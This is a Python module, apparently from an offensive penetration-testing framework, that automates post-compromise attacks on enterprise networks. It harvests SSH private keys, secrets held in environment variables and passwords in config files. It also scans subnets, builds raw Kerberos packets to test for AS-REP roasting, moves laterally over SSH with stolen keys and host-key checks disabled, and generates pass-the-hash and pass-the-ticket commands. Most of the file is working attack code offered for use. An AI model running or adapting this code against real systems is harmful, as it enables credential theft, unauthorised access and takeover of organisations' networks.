"""DRAKBEN Hive Mind - Enterprise Network Intelligence & Lateral Movement
Author: @drak_ben
Description: Active Directory analysis, lateral movement, and network pivoting.

This module provides:
- Active Directory enumeration and attack automation
- Lateral movement techniques (Pass-the-Hash, SSH Key Harvesting)
- Network topology discovery
- Credential harvesting and impersonation
- BloodHound-style attack path analysis
"""

import contextlib
import ipaddress
import logging
import os
import re
import secrets
import shlex
import socket
import subprocess
from collections.abc import Generator
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS
# =============================================================================


class CredentialType(Enum):
    """Types of harvested credentials."""

    PASSWORD = "password"  # noqa: S105
    NTLM_HASH = "ntlm_hash"
    KERBEROS_TICKET = "kerberos_ticket"
    SSH_KEY = "ssh_key"
    TOKEN = "token"  # noqa: S105
    CERTIFICATE = "certificate"


class MovementTechnique(Enum):
    """Lateral movement techniques."""

    PSEXEC = "psexec"
    WMIEXEC = "wmiexec"
    SMBEXEC = "smbexec"
    WINRM = "winrm"
    SSH = "ssh"
    RDP = "rdp"
    PASS_THE_HASH = "pth"  # noqa: S105
    PASS_THE_TICKET = "ptt"  # noqa: S105


class ADAttack(Enum):
    """Active Directory attack types."""

    KERBEROASTING = "kerberoasting"
    ASREP_ROASTING = "asrep_roasting"
    DCSYNC = "dcsync"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    ZEROLOGON = "zerologon"


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class Credential:
    """Harvested credential."""

    username: str
    domain: str
    credential_type: CredentialType
    value: str  # Password, hash, or key content
    source: str  # Where was this found
    admin_level: bool = False
    valid: bool = True
    metadata: dict[str, Any] = field(default_factory=dict)


@dataclass
class NetworkHost:
    """Discovered network host."""

    ip: str
    hostname: str | None = None
    domain: str | None = None
    os: str | None = None
    ports: list[int] = field(default_factory=list)
    services: dict[int, str] = field(default_factory=dict)
    credentials: list[Credential] = field(default_factory=list)
    compromised: bool = False
    pivot_point: bool = False


@dataclass
class AttackPath:
    """Path from current position to target."""

    source: str
    target: str
    hops: list[str]
    techniques: list[MovementTechnique]
    credentials_needed: list[str]
    probability: float  # Success probability 0-1


@dataclass
class DomainInfo:
    """Active Directory domain information."""

    name: str
    netbios_name: str
    domain_controllers: list[str]
    forest: str | None = None
    functional_level: str | None = None
    users: list[str] = field(default_factory=list)
    computers: list[str] = field(default_factory=list)
    groups: list[str] = field(default_factory=list)
    trusts: list[str] = field(default_factory=list)


# =============================================================================
# CREDENTIAL HARVESTER
# =============================================================================


class CredentialHarvester:
    """Credential harvesting from various sources.

    Sources:
    - Memory (mimikatz-style)
    - Files (config files, SSH keys)
    - Registry (Windows credentials)
    - Environment variables
    - Browser storage
    """

    def __init__(self) -> None:
        """Initialize the credential harvester with internal storage."""
        self.harvested: list[Credential] = []
        self.patterns: list[str] = [
            r"password\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"db_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"admin_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"secret\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
            r"token\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
        ]

    def _try_harvest_ssh_key(self, key_path: Path) -> Credential | None:
        """Try to harvest a single SSH key file."""
        try:
            content = key_path.read_text()
            if "PRIVATE KEY" not in content:
                return None

            username = self._get_ssh_username(str(key_path))
            cred = Credential(
                username=username or os.getenv("USER", "unknown"),
                domain="",
                credential_type=CredentialType.SSH_KEY,
                value=content,
                source=str(key_path),
                metadata={"encrypted": "ENCRYPTED" in content},
            )
            logger.info("Found SSH key: %s", key_path)
            return cred
        except PermissionError:
            logger.debug("Permission denied reading SSH key: %s", key_path)
        except Exception as e:
            logger.debug("Error reading SSH key {key_path}: %s", e)
        return None

    def harvest_ssh_keys(self) -> list[Credential]:
        """Harvest SSH private keys from common locations."""
        found = []
        ssh_dir = Path.home() / ".ssh"

        if not ssh_dir.exists():
            return found

        for key_file in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
            key_path = ssh_dir / key_file
            if not key_path.exists():
                continue
            cred = self._try_harvest_ssh_key(key_path)
            if cred:
                found.append(cred)
                self.harvested.append(cred)

        return found

    def harvest_known_hosts(self) -> list[str]:
        """Parse SSH known_hosts for target discovery.

        Returns:
            List of hostnames/IPs from known_hosts

        """
        hosts = []
        known_hosts_path = Path.home() / ".ssh" / "known_hosts"

        if known_hosts_path.exists():
            try:
                for line in known_hosts_path.read_text().splitlines():
                    if line.strip() and not line.startswith("#"):
                        # Format: hostname,ip algo key
                        parts = line.split()
                        if parts:
                            host_part = parts[0].split(",")
                            hosts.extend(host_part)
            except Exception as e:
                logger.debug("Error reading known_hosts: %s", e)

        return list(set(hosts))

    def harvest_environment(self) -> list[Credential]:
        """Harvest credentials from environment variables.

        Returns:
            List of potential credentials from environment

        """
        found = []
        sensitive_patterns = [
            "PASSWORD",
            "PASSWD",
            "SECRET",
            "TOKEN",
            "API_KEY",
            "APIKEY",
            "ACCESS_KEY",
            "PRIVATE_KEY",
            "CREDENTIAL",
        ]

        for key, value in os.environ.items():
            for pattern in sensitive_patterns:
                if pattern in key.upper() and value:
                    cred = Credential(
                        username="env:" + key,
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=value,
                        source="environment",
                        metadata={"env_var": key},
                    )
                    found.append(cred)
                    self.harvested.append(cred)

        return found

    def _parse_config_file(self, filepath: str, password_regex: "re.Pattern") -> list["Credential"]:
        """Parse a single config file for credentials."""
        found_in_file = []
        try:
            content = Path(filepath).read_text(errors="ignore")
            matches = password_regex.findall(content)
            for match in matches:
                if len(match) > 3 and match.lower() not in [
                    "null",
                    "none",
                    "empty",
                    "changeme",
                ]:
                    cred = Credential(
                        username="config",
                        domain="",
                        credential_type=CredentialType.PASSWORD,
                        value=match,
                        source=filepath,
                    )
                    found_in_file.append(cred)
        except (OSError, PermissionError):
            pass
        return found_in_file

    def _get_config_files(self, search_paths: list[str], patterns: list[str]) -> Generator[str, None, None]:
        """Generator for relevant config files."""
        for search_path in search_paths:
            if not Path(search_path).exists():
                continue
            for root, dirs, files in os.walk(search_path):
                dirs[:] = [d for d in dirs if not d.startswith(".")]
                for filename in files:
                    filepath = Path(root) / filename
                    # Simple filter check
                    if any(
                        str(filepath).endswith(p.replace("*", "")) for p in patterns
                    ) or any(p.replace("*", "") in filename for p in patterns):
                        yield str(filepath)

    def harvest_config_files(
        self, search_paths: list[str] | None = None,
    ) -> list[Credential]:
        """Search config files for embedded credentials.
        Architecture: Uses a generator for memory-efficient file discovery and
        centralized parsing to maintain low cognitive complexity.
        """
        if search_paths is None:
            search_paths = [str(Path.home())]

        found = []
        patterns = [
            "*.conf",
            "*.cfg",
            "*.ini",
            "*.yaml",
            "*.yml",
            ".env",
            ".netrc",
            ".pgpass",
            ".my.cnf",
        ]
        password_regex = re.compile(
            r'(?:password|passwd|pwd|secret|token|api_key|apikey)\s*[=:]\s*["\']?([^"\'\s]+)',
            re.IGNORECASE,
        )

        for filepath in self._get_config_files(search_paths, patterns):
            file_creds = self._parse_config_file(filepath, password_regex)
            found.extend(file_creds)
            self.harvested.extend(file_creds)

        return found

    def _get_ssh_username(self, _key_path: str) -> str:
        """Try to determine SSH username from config."""
        try:
            config_path = Path.home() / ".ssh" / "config"
            if config_path.exists():
                # Simple parser for Host * User pattern
                content = config_path.read_text()
                for line in content.splitlines():
                    if line.strip().startswith("User "):
                        return line.split()[1]
        except Exception:
            pass
        return os.getlogin() if hasattr(os, "getlogin") else "unknown"

    def get_all_credentials(self) -> list[Credential]:
        """Get all harvested credentials."""
        return self.harvested.copy()


# =============================================================================
# NETWORK MAPPER
# =============================================================================


class NetworkMapper:
    """Network topology discovery and mapping.

    Discovers:
    - Local network hosts
    - Open ports and services
    - Network relationships
    - Potential pivot points
    """

    def __init__(self) -> None:
        self.discovered_hosts: dict[str, NetworkHost] = {}
        self.local_interfaces: list[str] = []

    def get_local_interfaces(self) -> list[str]:
        """Get local network interfaces and their IPs."""
        interfaces = []

        try:
            # Get all network interfaces
            import socket

            hostname = socket.gethostname()

            # Get all IPs for this host
            try:
                ips = socket.getaddrinfo(hostname, None, socket.AF_INET)
                for ip_info in ips:
                    ip = ip_info[4][0]
                    if not ip.startswith("127."):
                        interfaces.append(ip)
            except socket.gaierror:
                pass

            # Also try to get the primary IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                primary_ip = s.getsockname()[0]
                s.close()
                if primary_ip not in interfaces:
                    interfaces.append(primary_ip)
            except Exception as e:
                logger.debug("Failed to get primary IP: %s", e)

        except Exception as e:
            logger.debug("Error getting interfaces: %s", e)

        self.local_interfaces = interfaces
        return interfaces

    def get_local_subnet(self, ip: str) -> str:
        """Get the /24 subnet for an IP."""
        try:
            network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
            return str(network)
        except ValueError:
            return f"{ip}/24"

    def quick_scan(
        self, target: str, ports: list[int] | None = None,
    ) -> NetworkHost | None:
        """Quick port scan of a single target.

        Args:
            target: IP or hostname
            ports: Ports to scan (default: common ports)

        Returns:
            NetworkHost object or None

        """
        if ports is None:
            ports = [22, 80, 135, 139, 443, 445, 3389, 5985, 5986]

        open_ports = []
        services = {}

        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()

                if result == 0:
                    open_ports.append(port)
                    services[port] = self._guess_service(port)

            except Exception as e:
                logger.debug("Service guessing failed for port %s: %s", port, e)
                continue

        if open_ports:
            host = NetworkHost(ip=target, ports=open_ports, services=services)
            self.discovered_hosts[target] = host
            return host

        return None

    def _guess_service(self, port: int) -> str:
        """Guess service name from port number."""
        common_ports = {
            21: "ftp",
            22: "ssh",
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            135: "msrpc",
            139: "netbios-ssn",
            143: "imap",
            443: "https",
            445: "microsoft-ds",
            993: "imaps",
            995: "pop3s",
            1433: "mssql",
            1521: "oracle",
            3306: "mysql",
            3389: "rdp",
            5432: "postgresql",
            5985: "winrm-http",
            5986: "winrm-https",
            6379: "redis",
            8080: "http-proxy",
            8443: "https-alt",
        }
        return common_ports.get(port, f"unknown-{port}")

    def is_windows_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Windows."""
        windows_ports = {135, 139, 445, 3389, 5985}
        return bool(set(host.ports) & windows_ports)

    def is_linux_host(self, host: NetworkHost) -> bool:
        """Check if host appears to be Linux."""
        return 22 in host.ports and not self.is_windows_host(host)

    def find_pivot_points(self) -> list[NetworkHost]:
        """Find potential pivot points (hosts with multiple network access)."""
        pivots = []
        for host in self.discovered_hosts.values():
            # Hosts with RDP/SSH and other services are good pivot points
            if (22 in host.ports or 3389 in host.ports) and len(host.ports) > 2:
                host.pivot_point = True
                pivots.append(host)
        return pivots


# =============================================================================
# ACTIVE DIRECTORY ANALYZER
# =============================================================================


class KerberosPacketFactory:
    """Native Python Kerberos Packet Factory.
    Constructs raw ASN.1/DER encoded Kerberos packets without external dependencies.
    """

    @staticmethod
    def build_as_req(username: str, domain: str) -> bytes:
        """Builds a minimal raw AS-REQ packet for AS-REP Roasting checks.

        Structure (Simplified RFC4120):
        AS-REQ := [APPLICATION 10] KDC-REQ
        KDC-REQ := SEQUENCE {
            pvno [1] INTEGER (5),
            msg-type [2] INTEGER (10 -- AS-REQ),
            padata [3] SEQUENCE OF PA-DATA OPTIONAL,
            req-body [4] KDC-REQ-BODY
        }

        This implementation constructs the byte sequence manually using struct
        to avoid bulky ASN.1 libraries, ensuring 'surgical' precision and zero-dependency.
        """

        # 1. Basic ASN.1 Encoders (Minimalist)
        def encode_len(length: int) -> bytes:
            if length < 128:
                return bytes([length])
            b = length.to_bytes((length.bit_length() + 7) // 8, "big")
            return bytes([0x80 | len(b)]) + b

        def seq(tags: int, content: bytes) -> bytes:
            encoded_length = encode_len(len(content))
            return bytes([tags]) + encoded_length + content

        def int_val(val: int) -> bytes:
            # Integer encoding
            b = val.to_bytes((val.bit_length() + 7) // 8 + 1, "big", signed=True)
            return seq(0x02, b)  # 0x02 = INTEGER

        def str_val(val: str) -> bytes:
            # GeneralString encoding
            return seq(0x1B, val.encode("utf-8"))

        # 2. Build KDC-REQ-BODY
        # cname (PrincipalName)
        #   name-type: 1 (NT-PRINCIPAL)
        #   name-string: SEQUENCE of username
        name_string = seq(0x30, str_val(username))
        cname_val = seq(
            0x30,
            seq(0xA0, int_val(1))  # name-type
            + seq(0xA1, name_string),  # name-string
        )
        cname = seq(0xA0, cname_val)

        # realm
        realm = seq(0xA1, str_val(domain.upper()))

        # sname (krbtgt/DOMAIN)
        sname_strings = seq(0x30, str_val("krbtgt") + str_val(domain.upper()))
        sname_val = seq(
            0x30,
            seq(0xA0, int_val(2))  # name-type (NT-SRV-INST)
            + seq(0xA1, sname_strings),
        )
        sname = seq(0xA2, sname_val)

        # till (20370913024805Z - generic future date)
        till = seq(0xA5, seq(0x18, b"20370913024805Z"))

        # nonce (random)
        nonce_int = secrets.randbits(31)
        nonce = seq(0xA6, int_val(nonce_int))

        # etypes (RC4-HMAC=23) - focused on downgrade/roasting
        # SEQUENCE OF INTEGER
        etypes_val = seq(0x30, int_val(23))
        etypes = seq(0xA7, etypes_val)

        # KDC-REQ-BODY Sequence
        # options: 4 (Forwardable) -> BIT STRING
        # We skip options for minimal roast check req
        req_body_content = (
            seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
        )
        req_body = seq(0x30, req_body_content)

        # 3. Build KDC-REQ
        pvno = seq(0xA1, int_val(5))
        msg_type = seq(0xA2, int_val(10))  # AS-REQ

        # No PA-DATA (Pre-Auth Data) -> This is the key for Roasting check!
        # If server replies with enc-part, user is vulnerable (No Pre-Auth required)

        kdc_req_content = pvno + msg_type + seq(0xA4, req_body)
        kdc_req = seq(0x30, kdc_req_content)

        # 4. Wrap in APPLICATION 10
        return seq(0x6A, kdc_req)


class ADAnalyzer:
    """Active Directory enumeration and analysis.

    Capabilities:
    - Domain enumeration
    - User/Group discovery
    - Trust relationships
    - Attack path calculation
    - Kerberos attacks
    """

    def __init__(self) -> None:
        self.domain_info: DomainInfo | None = None
        self.attack_paths: list[AttackPath] = []

    def detect_domain(self) -> str | None:
        """Detect if we're on a domain-joined machine.

        Returns:
            Domain name or None

        """
        # Check environment variables (Windows)
        domain = os.environ.get("USERDOMAIN")
        if domain and domain != os.environ.get("COMPUTERNAME"):
            return domain

        # Check /etc/resolv.conf (Linux)
        try:
            with open("/etc/resolv.conf") as f:
                for line in f:
                    if line.startswith(("search ", "domain ")):
                        parts = line.split()
                        if len(parts) > 1:
                            return parts[1]
        except FileNotFoundError:
            pass

        return None

    def enumerate_domain(self, domain: str) -> DomainInfo | None:
        """Enumerate Active Directory domain.

        Args:
            domain: Domain name

        Returns:
            DomainInfo object or None

        """
        info = DomainInfo(
            name=domain,
            netbios_name=domain.split(".")[0].upper()
            if "." in domain
            else domain.upper(),
            domain_controllers=[],
        )

        # Try to find domain controllers via DNS
        try:
            # Look for _ldap._tcp SRV records
            # Look for _ldap._tcp SRV records (Query logic for future implementation)
            # This would use DNS query in real implementation
            # For now, try to resolve common DC names
            for prefix in ["dc", "dc1", "dc01", "pdc"]:
                try:
                    socket.gethostbyname(f"{prefix}.{domain}")
                    info.domain_controllers.append(f"{prefix}.{domain}")
                except socket.gaierror:
                    continue
        except Exception as e:
            logger.debug("Error enumerating DCs: %s", e)

        self.domain_info = info
        return info

    def get_kerberoastable_users(self) -> list[str]:
        """Get list of potentially kerberoastable users.

        Returns:
            List of usernames with SPNs

        """
        # In real implementation, this would query AD for users with SPNs
        # For now, return common service account patterns
        return [
            "svc_*",
            "service_*",
            "sql*",
            "web*",
            "iis*",
            "backup*",
            "admin*",
            "exchange*",
            "sharepoint*",
        ]

    def get_asrep_roastable_users(self) -> list[str]:
        """Get list of users vulnerable to AS-REP roasting.

        Returns:
            List of usernames without pre-auth

        """
        return []

    def native_check_asrep_roasting(
        self,
        domain: str,
        users: list[str],
        dc_ip: str,
    ) -> list[str]:
        """Check for AS-REP Roasting using native Python sockets.
        Sends raw AS-REQ without Pre-Auth.

        Args:
            domain: Target domain
            users: List of users to check
            dc_ip: Domain Controller IP

        Returns:
            List of vulnerable users (those who returned AS-REP instead of KRB-ERROR)

        """
        vulnerable_users = []

        for user in users:
            try:
                # 1. Build Packet
                packet = KerberosPacketFactory.build_as_req(user, domain)

                # 2. Send to DC (UDP 88)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                sock.sendto(packet, (dc_ip, 88))

                # 3. Receive Response
                data, _ = sock.recvfrom(4096)
                sock.close()

                # 4. Analyze Response
                # AS-REP = Application 11 (0x6B)
                # KRB-ERROR = Application 30 (0x7E)
                if data[0] == 0x6B:
                    # We got a Ticket! (Vulnerable)
                    logger.warning("AS-REP Roasting Success: %s is vulnerable!", user)
                    vulnerable_users.append(user)

            except Exception as e:
                logger.debug("Roasting check failed for {user}: %s", e)

        return vulnerable_users

    def calculate_attack_path(
        self,
        source: str,
        target: str,
        available_creds: list[Credential],
        discovered_hosts: dict[str, NetworkHost],
    ) -> AttackPath | None:
        """Calculate attack path from source to target.

        BloodHound-style shortest path calculation.

        Args:
            source: Current position (hostname/IP)
            target: Target (hostname/IP or "Domain Admin")
            available_creds: Available credentials
            discovered_hosts: Discovered network hosts

        Returns:
            AttackPath or None if no path found

        """
        # Simple path calculation
        # In real implementation, this would use graph algorithms

        hops = []
        techniques = []
        creds_needed = []

        source_host = discovered_hosts.get(source)
        target_host = discovered_hosts.get(target)

        if not source_host:
            return None

        # Check direct connection
        if target_host:
            if 22 in target_host.ports:
                techniques.append(MovementTechnique.SSH)
                creds_needed.append("ssh_key_or_password")
            elif 445 in target_host.ports:
                techniques.append(MovementTechnique.PSEXEC)
                creds_needed.append("admin_ntlm_hash_or_password")
            elif 5985 in target_host.ports:
                techniques.append(MovementTechnique.WINRM)
                creds_needed.append("admin_password")
            elif 3389 in target_host.ports:
                techniques.append(MovementTechnique.RDP)
                creds_needed.append("interactive_logon_creds")

            hops = [target]

        if hops:
            # Calculate success probability based on available creds
            probability = 0.5  # Base probability
            for cred in available_creds:
                if cred.admin_level:
                    probability = min(0.9, probability + 0.2)

            return AttackPath(
                source=source,
                target=target,
                hops=hops,
                techniques=techniques,
                credentials_needed=creds_needed,
                probability=probability,
            )

        return None


# =============================================================================
# LATERAL MOVEMENT ENGINE
# =============================================================================


class LateralMover:
    """Lateral movement execution engine.

    Techniques:
    - Pass-the-Hash (PTH)
    - Pass-the-Ticket (PTT)
    - psexec/wmiexec/smbexec
    - SSH with harvested keys
    - WinRM
    """

    def __init__(self) -> None:
        self.successful_moves: list[dict[str, Any]] = []
        self.failed_moves: list[dict[str, Any]] = []

    def _prepare_ssh_key(self, key_content: str) -> str:
        """Securely write SSH key to temp file."""
        import tempfile

        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".key") as f:
            f.write(key_content)
            key_file = f.name
        os.chmod(key_file, 0o600)
        return key_file

    def _execute_ssh(
        self,
        cmd_list: list[str],
        timeout: int = 30,
    ) -> tuple[bool, str, str]:
        """Execute SSH command with subprocess."""
        proc = None
        try:
            proc = subprocess.Popen(
                cmd_list,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            stdout, stderr = proc.communicate(timeout=timeout)
            return proc.returncode == 0, stdout, stderr
        except subprocess.TimeoutExpired:
            if proc:
                proc.kill()
                proc.communicate()
            return False, "", "Connection timeout"
        except Exception as e:
            return False, "", str(e)

    def move_ssh(
        self,
        target: str,
        username: str,
        credential: Credential,
        command: str | None = None,
    ) -> dict[str, Any]:
        """Move to target via SSH (Refactored for complexity)."""
        result = {
            "technique": MovementTechnique.SSH.value,
            "target": target,
            "username": username,
            "success": False,
            "output": "",
            "error": "",
        }

        if credential.credential_type != CredentialType.SSH_KEY:
            result["error"] = (
                "Password authentication requires sshpass (Not implemented)"
            )
            return result

        key_file = self._prepare_ssh_key(credential.value)
        try:
            ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
            cmd_list = [
                "ssh",
                *shlex.split(ssh_opts),
                "-i",
                key_file,
                f"{username}@{target}",
            ]
            if command:
                cmd_list.append(command)

            success, stdout, stderr = self._execute_ssh(cmd_list)
            result.update({"success": success, "output": stdout, "error": stderr})
        finally:
            with contextlib.suppress(Exception):
                os.unlink(key_file)

        if result["success"]:
            self.successful_moves.append(result)
        else:
            self.failed_moves.append(result)

        return result

    def generate_pth_command(
        self,
        target: str,
        username: str,
        ntlm_hash: str,
        technique: MovementTechnique = MovementTechnique.PSEXEC,
    ) -> str:
        """Generate Pass-the-Hash command for impacket tools.

        Args:
            target: Target host
            username: Username
            ntlm_hash: NTLM hash
            technique: Which impacket tool to use

        Returns:
            Command string

        """
        domain = ""
        if "\\" in username:
            domain, username = username.split("\\")
        elif "@" in username:
            username, domain = username.split("@")

        # Format: tool domain/user@target -hashes :ntlm_hash
        tool_map = {
            MovementTechnique.PSEXEC: "psexec.py",
            MovementTechnique.WMIEXEC: "wmiexec.py",
            MovementTechnique.SMBEXEC: "smbexec.py",
        }

        tool = tool_map.get(technique, "psexec.py")

        user_spec = f"{domain}/{username}" if domain else username

        return f"{tool} {user_spec}@{target} -hashes :{ntlm_hash}"

    def generate_ptt_command(self, target: str, ticket_path: str) -> str:
        """Generate Pass-the-Ticket command.

        Args:
            target: Target host
            ticket_path: Path to Kerberos ticket

        Returns:
            Command string

        """
        return f"export KRB5CCNAME={ticket_path} && psexec.py -k -no-pass {target}"

    def get_movement_stats(self) -> dict[str, Any]:
        """Get statistics about movement attempts."""
        return {
            "successful": len(self.successful_moves),
            "failed": len(self.failed_moves),
            "techniques_used": list({m["technique"] for m in self.successful_moves}),
            "targets_compromised": list({m["target"] for m in self.successful_moves}),
        }


# =============================================================================
# HIVE MIND - MAIN ORCHESTRATOR
# =============================================================================


class HiveMind:
    """Main orchestrator for enterprise network intelligence.

    Coordinates:
    - Credential harvesting
    - Network mapping
    - AD analysis
    - Lateral movement
    - Attack path optimization

    Usage:
        hive = HiveMind()
        hive.initialize()
        paths = hive.find_attack_paths("Domain Admin")
        hive.execute_movement(paths[0])
    """

    def __init__(self) -> None:
        """Initialize Hive Mind."""
        self.harvester = CredentialHarvester()
        self.mapper = NetworkMapper()
        self.ad_analyzer = ADAnalyzer()
        self.mover = LateralMover()

        self.current_host: str | None = None
        self.initialized: bool = False

        logger.info("Hive Mind initialized")

    def initialize(self) -> dict[str, Any]:
        """Initialize Hive Mind with local reconnaissance.

        Returns:
            Dict with initialization results

        """
        results = {
            "interfaces": [],
            "domain": None,
            "credentials_found": 0,
            "ssh_targets": [],
            "errors": [],
        }

        try:
            # Get local network info
            results["interfaces"] = self.mapper.get_local_interfaces()
            if results["interfaces"]:
                self.current_host = results["interfaces"][0]

            # Check for domain
            results["domain"] = self.ad_analyzer.detect_domain()

            # Harvest local credentials
            self.harvester.harvest_ssh_keys()
            self.harvester.harvest_environment()
            results["credentials_found"] = len(self.harvester.harvested)

            # Get SSH targets from known_hosts
            results["ssh_targets"] = self.harvester.harvest_known_hosts()[:10]

            self.initialized = True

        except Exception as e:
            results["errors"].append(str(e))
            logger.exception("Initialization error: %s", e)

        return results

    def scan_network(self, subnet: str | None = None) -> list[NetworkHost]:
        """Scan local network for hosts.

        Args:
            subnet: Subnet to scan (default: auto-detect)

        Returns:
            List of discovered hosts

        """
        if subnet is None and self.current_host:
            subnet = self.mapper.get_local_subnet(self.current_host)

        discovered = []

        if subnet:
            # Parse subnet and scan first 20 hosts (quick scan)
            try:
                network = ipaddress.IPv4Network(subnet, strict=False)
                for i, ip in enumerate(network.hosts()):
                    if i >= 20:  # Limit for quick scan
                        break
                    host = self.mapper.quick_scan(str(ip))
                    if host:
                        discovered.append(host)
            except ValueError as e:
                logger.exception("Invalid subnet: %s", e)

        return discovered

    def find_attack_paths(self, _target: str = "Domain Admin") -> list[AttackPath]:
        """Find attack paths to target.

        Args:
            target: Target (hostname, IP, or "Domain Admin")

        Returns:
            List of possible attack paths

        """
        paths = []

        if not self.current_host:
            return paths

        # Calculate paths to each discovered host
        for host_ip in self.mapper.discovered_hosts:
            path = self.ad_analyzer.calculate_attack_path(
                source=self.current_host,
                target=host_ip,
                available_creds=self.harvester.harvested,
                discovered_hosts=self.mapper.discovered_hosts,
            )
            if path:
                paths.append(path)

        # Sort by probability
        paths.sort(key=lambda p: p.probability, reverse=True)

        return paths

    def _find_matching_credential(
        self,
        technique: MovementTechnique,
    ) -> Credential | None:
        """Find a credential matching the movement technique."""
        for c in self.harvester.harvested:
            if (
                technique == MovementTechnique.SSH
                and c.credential_type == CredentialType.SSH_KEY
            ):
                return c
            if (
                technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]
                and c.credential_type == CredentialType.NTLM_HASH
            ):
                return c
        return None

    def _execute_hop(
        self,
        hop: str,
        technique: MovementTechnique,
        result: dict[str, Any],
    ) -> bool:
        """Execute a single hop in the attack path."""
        cred = self._find_matching_credential(technique)
        if not cred:
            result["output"] = f"No suitable credential for {technique.value}"
            return False

        if technique == MovementTechnique.SSH:
            move_result = self.mover.move_ssh(hop, cred.username, cred, "whoami")
            if move_result["success"]:
                result["hops_completed"] += 1
                result["final_position"] = hop
                self.current_host = hop
                return True
        elif technique in [MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH]:
            cmd = self.mover.generate_pth_command(hop, cred.username, cred.value)
            result["output"] = f"Manual execution required: {cmd}"
            return False
        return False

    def execute_movement(self, path: AttackPath) -> dict[str, Any]:
        """Execute lateral movement along attack path (Refactored for complexity)."""
        result = {
            "path": path,
            "success": False,
            "hops_completed": 0,
            "final_position": self.current_host,
            "output": "",
        }

        for i, hop in enumerate(path.hops):
            technique = (
                path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
            )
            if not self._execute_hop(hop, technique, result):
                break

        result["success"] = result["hops_completed"] == len(path.hops)
        return result

    def get_status(self) -> dict[str, Any]:
        """Get current Hive Mind status."""
        return {
            "initialized": self.initialized,
            "current_host": self.current_host,
            "credentials": len(self.harvester.harvested),
            "discovered_hosts": len(self.mapper.discovered_hosts),
            "domain": self.ad_analyzer.domain_info.name
            if self.ad_analyzer.domain_info
            else None,
            "movement_stats": self.mover.get_movement_stats(),
        }


# =============================================================================
# MODULE-LEVEL FUNCTIONS
# =============================================================================


def get_hive_mind() -> HiveMind:
    """Get singleton HiveMind instance.

    Returns:
        HiveMind instance

    """
    global _hive_mind
    if "_hive_mind" not in globals() or _hive_mind is None:
        _hive_mind = HiveMind()
    return _hive_mind


def quick_recon() -> dict[str, Any]:
    """Quick local reconnaissance.

    Returns:
        Dict with recon results

    """
    hive = get_hive_mind()
    return hive.initialize()
